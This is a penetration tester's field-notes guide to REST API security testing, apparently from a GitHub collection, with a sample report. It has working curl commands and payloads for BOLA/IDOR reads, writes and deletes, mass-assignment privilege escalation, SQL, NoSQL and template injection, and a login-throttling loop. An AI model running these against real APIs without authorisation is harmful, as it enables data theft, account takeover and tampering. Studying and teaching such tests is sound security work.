# REST API Security — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API Security Top 10
>
> **Context:** REST API penetration testing is my primary day-to-day work at Infosys. Every modern enterprise application I test is API-first — the browser renders a JavaScript shell, and every piece of business logic, every data access decision, every access control check happens in the API layer. This write-up reflects five years of finding vulnerabilities in enterprise REST APIs across BFSI, healthcare, retail, and technology sectors.

---

## 🧠 Why REST API Testing Requires a Different Mindset

```
Traditional web app testing:
  Browser → HTML form → Server → HTML response
  You see what you test. The attack surface is visible.

Enterprise REST API testing:
  SPA → REST API → Microservices → Databases
  The attack surface is mostly invisible from the browser.
  Most of the API surface is never rendered in the UI at all.

The developer assumption that breaks enterprise APIs:
  "Only our frontend calls these endpoints"
  → Wrong. Any authenticated HTTP client can call them.
  → The API must enforce access control itself, not rely on UI filtering.

The developer assumption that breaks enterprise APIs #2:
  "We return the full object but the UI only shows 6 fields"
  → Wrong. I see all 47 fields in the raw JSON response.
  → password_hash, salary, is_admin — all visible in the response body.

My developer background matters here:
  I know why APIs are built the way they are.
  I know which shortcuts developers take under deadline pressure.
  I know where the access control checks get missed.
  That context is what finds the vulnerabilities automated scanners miss.
```

---

## 📖 REST Architecture — The Security-Relevant Parts

### HTTP Methods — Security Implications of Each

```
Method      Purpose             Security Testing Priority
───────────────────────────────────────────────────────────
GET         Read resource       IDOR — are other users' resources returned?
                                Over-fetching — are too many fields returned?
                                Unauthenticated — does it require a token?

POST        Create resource     Injection — SQLi, XSS, SSTI in body fields
                                Mass assignment — extra privileged fields accepted?
                                Rate limiting — can I POST 1000 times?

PUT         Full update         IDOR — can I PUT to another user's resource ID?
                                Mass assignment — role/is_admin fields accepted?

PATCH       Partial update      Often less hardened than PUT (teams test PUT, forget PATCH)
                                Same IDOR and mass assignment risks as PUT

DELETE      Delete resource     IDOR — can I DELETE another user's resource?
                                Unauthenticated — no auth check on DELETE?
                                Irreversible — highest-impact IDOR variant

OPTIONS     CORS preflight      CORS misconfiguration — what origins are allowed?
                                HTTP method disclosure — what methods are enabled?

HEAD        Headers only        Sometimes bypasses access controls (treated as safe)
                                Can reveal resource existence without body content

# My testing rule: always test every method on every endpoint
# PATCH and DELETE are consistently the least-tested in enterprise apps
```

### HTTP Status Codes — Reading Between the Lines

```
200 OK:
  The happy path — but always inspect the response body.
  Hidden fields, excessive data, internal system information.

201 Created:
  New resource created. What is in the Location header?
  Does the response body include more than intended?

204 No Content:
  Successful with no body. Common for DELETE.
  Test without auth — if still 204, unauthenticated delete.

400 Bad Request:
  Invalid input. Does the error message reveal field names?
  "Field 'user_id' is required" → confirms parameter name.

401 Unauthorized:
  Good — auth is enforced. Note which endpoints return this.
  If you hit a 401, it confirms the endpoint exists.

403 Forbidden:
  Auth valid, access denied. Does not mean unexploitable.
  Test bypass headers: X-Original-URL, X-Rewrite-URL.
  Test alternate paths: /ADMIN/, //admin/, /%2fadmin.

404 Not Found:
  Usually means not found. But custom 404 pages sometimes
  return 200 — check response body, not just status code.
  Also: 404 for authenticated vs 403 for unauthenticated
  tells you the endpoint exists.

422 Unprocessable Entity:
  Validation failed. Extremely useful — error messages often
  list all expected fields and their valid formats.
  This is free schema documentation from the server.

429 Too Many Requests:
  Rate limiting is working. Note which endpoints have it.
  If 100 rapid requests to /api/auth/login never return 429:
  → Missing rate limiting = Medium-High finding.

500 Internal Server Error:
  Always inspect the body. Stack traces, SQL errors, file paths,
  class names, framework versions — gold mine for attackers.
  A 500 with verbose error = separate information disclosure finding.
```

---

## 🔍 Phase 1 — API Surface Discovery

### Finding the Full API Surface Before Testing

```bash
# Step 1: Check for API documentation (openly published)
for path in swagger swagger-ui swagger-ui.html swagger-ui/index.html \
            api-docs v2/api-docs v3/api-docs openapi.json openapi.yaml \
            api/swagger.json api/openapi docs api/docs; do
  code=$(curl -so /dev/null -w "%{http_code}" \
         https://app.company.com/$path 2>/dev/null)
  [[ "$code" == "200" ]] && echo "FOUND: /$path"
done

# Step 2: JS bundle mining (most reliable for undocumented APIs)
# Install JS Miner in Burp or use manual approach:
curl -s https://app.company.com/static/js/main.chunk.js | \
  grep -oE '"(/api/[^"]+)"' | sort -u

# Step 3: API version enumeration
for v in v1 v2 v3 v4 beta alpha dev internal latest; do
  code=$(curl -so /dev/null -w "%{http_code}" \
         https://app.company.com/api/$v/users 2>/dev/null)
  echo "$v: $code"
done
# v1: 200, v2: 200, v3: 404, v4: 403 → test v4 (403 means it exists)

# Step 4: ffuf API endpoint fuzzing
ffuf -u https://api.company.com/api/v1/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,401,403 \
  -fs [baseline_404_size] \
  -o api_endpoints.json

# Step 5: Wayback Machine for historical API endpoints
curl -s "https://web.archive.org/cdx/search/cdx?\
url=*.company.com/api/*&output=json&fl=original&collapse=urlkey" \
  | jq -r '.[][0]' | sort -u | grep -i "api"
```

---

## 💥 Phase 2 — Enterprise REST API Attack Vectors

### Attack 1 — Broken Object Level Authorization (BOLA)

The #1 API vulnerability by frequency and impact in enterprise systems.

```bash
# Setup: two test accounts
# Account A (attacker): user_id = 1099, order_id = 8824
# Account B (victim):   user_id = 1042, order_id = 8823

# Test GET — can attacker read victim's data?
curl -s https://api.company.com/api/v1/orders/8823 \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" | jq .
# If victim's order returned = BOLA read access

# Test PUT — can attacker modify victim's data?
curl -s -X PUT https://api.company.com/api/v1/users/1042/profile \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' | jq .
# If 200 = BOLA write access = Critical

# Test DELETE — can attacker delete victim's resource?
curl -s -X DELETE https://api.company.com/api/v1/documents/9921 \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN"
# If 200/204 = BOLA delete = Critical

# Test ID locations — not just URL path:
# Query parameter:
curl -s "https://api.company.com/api/v1/data?user_id=1042" \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN"

# POST body:
curl -s -X POST https://api.company.com/api/v1/export \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1042, "format": "csv"}'

# Custom header:
curl -s https://api.company.com/api/v1/profile \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  -H "X-User-ID: 1042"
```

### Attack 2 — Broken Authentication

```bash
# Test 1: No authentication header at all
curl -s https://api.company.com/api/v1/users \
  -H "Accept: application/json"
# Expected: 401 Unauthorized
# Finding if: 200 with user data

# Test 2: Malformed / empty token
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer "
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer null"
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer undefined"

# Test 3: Expired token replay
# Save a valid token → log out → wait for expiry → replay
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer EXPIRED_TOKEN"
# If 200 = no server-side token invalidation

# Test 4: Cross-user token usage (is token bound to user?)
# Use Account B's token to access Account A's user-specific endpoint
curl -s https://api.company.com/api/v1/users/1099/orders \
  -H "Authorization: Bearer ACCOUNT_B_TOKEN"
# If 200 with account A's data = token not user-scoped

# Test 5: API key exposure
# Check all JavaScript files for API keys:
curl -s https://app.company.com/static/js/main.chunk.js | \
  grep -iE "(api_key|apikey|access_key|secret_key|bearer)\s*[:=]\s*['\"][A-Za-z0-9_-]{10,}"
```

### Attack 3 — Mass Assignment

```bash
# Step 1: GET your own profile to see ALL fields the API tracks
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | jq 'keys'

# Output might show:
# ["id", "name", "email", "role", "is_admin", "plan",
#  "credits", "is_verified", "internal_notes", "salary"]

# Step 2: Try injecting privileged fields via PUT/PATCH
curl -s -X PUT https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Dheeraj",
    "role": "admin",
    "is_admin": true,
    "plan": "enterprise",
    "credits": 99999,
    "is_verified": true
  }' | jq .

# Step 3: Check if any privileged field appears in the response
# or in a subsequent GET /users/me
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | jq '{role, is_admin, plan, credits}'

# If role = "admin" = Critical privilege escalation via mass assignment

# Also test at registration:
curl -s -X POST https://api.company.com/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "password": "Test123!",
    "role": "admin",
    "is_admin": true,
    "plan": "enterprise"
  }' | jq .
```

### Attack 4 — Excessive Data Exposure

```bash
# Compare what the UI shows vs what the API returns

# Step 1: Capture the API call behind a "view profile" page
# In Burp: intercept GET /api/v1/users/1099

# Step 2: Examine the FULL raw response
curl -s https://api.company.com/api/v1/users/1099 \
  -H "Authorization: Bearer TOKEN" | jq .

# UI shows: name, email, profile picture
# API returns:
{
  "id": 1099,
  "name": "Dheeraj Jayaswal",
  "email": "dheeraj@company.com",     ← shown in UI
  "password_hash": "$2a$10$...",       ← NOT shown — but present
  "salary": 95000,                     ← NOT shown — but present
  "national_id": "XXXX-XXXX-4521",    ← NOT shown — but present
  "is_admin": false,                   ← NOT shown — but present
  "internal_notes": "PIP Q2 2024",    ← NOT shown — but present
  "api_key": "live_sk_abc123"          ← NOT shown — but present
}

# Report: Sensitive data exposure in API response
# Over-fetching finding — DTO mapping missing
```

### Attack 5 — Injection in API Request Body

```bash
# SQL Injection in JSON body
curl -s -X POST https://api.company.com/api/v1/search \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "test'\''"}' | jq .
# SQL syntax error in response = SQLi vulnerable

# Time-based SQLi:
curl -s -X POST https://api.company.com/api/v1/users/filter \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"department": "1; WAITFOR DELAY '\''00:00:05'\''--"}' \
  -w "\nTime: %{time_total}s\n"
# ~5 second delay = time-based SQLi in MSSQL

# NoSQL Injection (MongoDB):
curl -s -X POST https://api.company.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
# If login succeeds = NoSQL injection bypass

# SSTI in API fields:
curl -s -X PUT https://api.company.com/api/v1/notifications/template \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello {{7*7}}, your order is ready"}'
# If returned/rendered message shows "Hello 49, your order is ready" = SSTI
```

### Attack 6 — Rate Limiting Absence Demonstration

```bash
# Professional demonstration — use non-real passwords
# Shows absence of throttling without actually brute-forcing accounts

for i in $(seq 1 50); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST https://api.company.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@company.com\",\"password\":\"WrongPass${i}\"}" \
    2>/dev/null)
  echo "Attempt $i: HTTP $code"
done

# Expected: HTTP 429 after 5-10 attempts
# Finding: All 50 attempts return HTTP 401 without 429 = no rate limiting
# Report: "50 consecutive authentication attempts completed without throttle"
```

---

## 🗂️ Systematic API Testing Checklist

```
PRE-TESTING SETUP
☐ Discover Swagger/OpenAPI spec → import to Postman
☐ Create two test accounts (attacker + victim)
☐ Configure Burp Autorize with victim's session token
☐ Enable JS Miner extension in Burp
☐ Browse entire application — capture all API calls

AUTHENTICATION
☐ Remove Authorization header entirely → expect 401
☐ Test with empty/null/undefined token value
☐ Test with expired token from previous session
☐ Test with another user's token on user-specific endpoints

BOLA / IDOR (every endpoint)
☐ Identify all object IDs: path params, query params, body params
☐ Substitute attacker IDs with victim IDs for GET → read test
☐ Test PUT/PATCH with victim IDs → write test
☐ Test DELETE with victim IDs → delete test (most impactful)
☐ Test all ID locations: URL, query string, body, headers

MASS ASSIGNMENT
☐ GET own profile → document ALL response fields
☐ Inject privileged fields in PUT/PATCH/POST
☐ Specifically test: role, is_admin, plan, credits, is_verified
☐ Test at registration (most commonly missed)

EXCESSIVE DATA EXPOSURE
☐ Compare UI display vs full raw JSON response
☐ Look for: password_hash, salary, national_id, api_key, is_admin
☐ Remove auth header from data endpoints → check if still returns

INJECTION
☐ Test SQL injection in all string parameters: '-- SLEEP(5)
☐ Test NoSQL injection in JSON: {"field": {"$gt": ""}}
☐ Test SSTI: {{7*7}}, ${7*7}, <%=7*7%>
☐ Test XSS in stored fields

RATE LIMITING
☐ Send 50 rapid requests to /auth/login → check for 429
☐ Test OTP/MFA endpoint: 50 rapid attempts
☐ Test password reset: 50 rapid requests
☐ Test export/report: concurrent heavy requests
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** BOLA — Any Authenticated User Can Access All Employee Records via Sequential ID Enumeration

**Severity:** Critical | **CVSS v3.1:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Affected Endpoint:** `GET /api/v1/employees/{id}` | `PUT /api/v1/employees/{id}/profile`

```
Test setup:
  Account A (attacker): employee_id = 1099
  Account B (victim):   employee_id = 1042

Step 1 — Establish baseline (own resource):
  curl -s https://hr.company.internal/api/v1/employees/1099 \
    -H "Authorization: Bearer ACCOUNT_A_TOKEN" | jq '.employee_id'
  → Returns: 1099 (own record)

Step 2 — Access victim's resource:
  curl -s https://hr.company.internal/api/v1/employees/1042 \
    -H "Authorization: Bearer ACCOUNT_A_TOKEN" | jq .
  → Returns: Full profile of employee 1042 including salary, bank
    account details, national ID, and disciplinary records

Step 3 — Enumerate all records:
  for id in $(seq 1001 1020); do
    curl -so /dev/null -w "$id: %{http_code}\n" \
      https://hr.company.internal/api/v1/employees/$id \
      -H "Authorization: Bearer ACCOUNT_A_TOKEN"
  done
  → All return 200 — all 4,200 employee records accessible

Impact:
  Complete exposure of salary, bank account, and national ID for
  all 4,200 employees. GDPR Article 33 breach notification required.

Remediation:
  Server-side ownership check: verify authenticated user ID == requested ID
  Admin role check: HR_Admin can access all, employees only their own
  Implement centralised authorisation middleware across all endpoints
```

---

## 🧭 Key Takeaways From 5+ Years of Enterprise API Testing

**1. BOLA is the most common Critical finding in enterprise APIs — always test it systematically.**
Every API endpoint that returns or modifies a resource with an ID is a potential BOLA target. Two test accounts, swap the IDs, check the response. Burp Autorize automates this across the entire application. It is the first thing I configure on every engagement.

**2. Old API versions have the worst security posture.**
`/api/v2/` gets the security attention. `/api/v1/` — which was supposed to be retired but still responds — often has no rate limiting, weaker auth checks, and missing IDOR controls. Certificate transparency and directory enumeration routinely surface old API versions. Always test them in parallel.

**3. The 422 error response is free API documentation.**
When you send an incomplete request and the server returns 422 Unprocessable Entity, the error message lists every field it expects, their types, and validation rules. This tells you exactly what parameters exist — including ones not in the UI and not in the documentation.

**4. Mass assignment at registration is the most consistently missed.**
Teams add mass assignment protection to profile update endpoints after being burned. They rarely go back and add it to the registration endpoint that was written first. Always test `POST /register` and `POST /users` with privileged field injection — it succeeds far more often than it should.

**5. Compare UI rendering vs raw API response on every data endpoint.**
The developer returned the full database object. The frontend filters what to display. The API still sends all 47 fields. Screenshots of this comparison — "UI shows 3 fields, API returns 12 including password hash and salary" — are among the clearest possible vulnerability demonstrations in a pentest report.

---

## 🔗 References
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger API Testing Research](https://portswigger.net/web-security/api-testing)
- [OWASP API Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-API_Testing/)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
